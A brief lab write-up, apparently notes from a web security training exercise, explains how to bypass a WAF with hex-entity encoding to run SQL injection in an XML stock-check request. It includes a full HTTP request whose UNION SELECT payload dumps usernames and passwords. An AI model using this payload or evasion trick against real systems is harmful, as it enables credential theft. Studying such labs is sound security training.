---
tags:
  - sqli
  - xml-encoding
---
## SQL injection with filter bypass via XML encoding

1. Check the stock on any item and note the POST request contains XML in the body
2. Use `hex_entities` in hackvertor to obfuscate the payload to bypass the WAF
3. Send the following request to get all credentials
4. Log in as admin to solve the lab

```
POST /product/stock HTTP/2
Host: 0a13008603ab45d581535c30006600e7.web-security-academy.net
Cookie: session=ezecKklwjpcvZJxxOIOVONBzEq8NcPnl
Content-Length: 190
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Content-Type: application/xml
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a13008603ab45d581535c30006600e7.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a13008603ab45d581535c30006600e7.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId><@hex_entities>1 UNION SELECT username || '~' || password from users</@hex_entities></storeId></stockCheck>
```